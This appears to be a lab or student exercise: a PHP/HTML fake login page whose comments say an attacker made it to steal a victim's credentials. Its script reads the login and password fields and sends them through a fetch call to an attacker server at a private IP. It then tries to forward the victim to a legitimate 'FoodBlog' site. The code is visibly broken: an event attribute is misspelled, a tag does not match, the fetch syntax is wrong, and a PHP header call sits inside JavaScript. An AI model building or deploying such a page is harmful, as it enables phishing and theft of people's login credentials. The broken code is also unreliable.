<?php

	
?>

<!DOCTYPE html>
<html>
	<body>
	<h2> Login page </h2>

<!-- this is a fake login created by the attacker to steal the creditionals of a victim-->
	<form onsumbit="send()">
		<p><label for="login">Login:</label><br />
		<input type="text" id="login" name="login" size="20" autocomplete="off"></p>

		<p><label for="password">Password:</label><br />
		<input type="password" id="password" name="password" size="20" autocomplete="off"></p>

		<button type="submit" name="form" value="submit">Login</bottun>

	</form>

	</body>
	<script>
	function send(){
		let username=document.getElementById('login').value; //get the username value from the login field
		let password = document.getElementById('password').value; //get the password value from the password field

		fetch{'http://192.168.206.138:83/?username=${username}&password=${password}'}; //sends the details that the victim wrote, to the attacker server
		header("Location: http://192.168.238.1/foodblog/?page=home.php"); //forward the victim to the legitimate FoodBlog site

	}
	</script>
	<?php
		if($_SERVER["REQUEST_METHOD"] == "POST") 
			include 'footer.php';
	?>
</html>
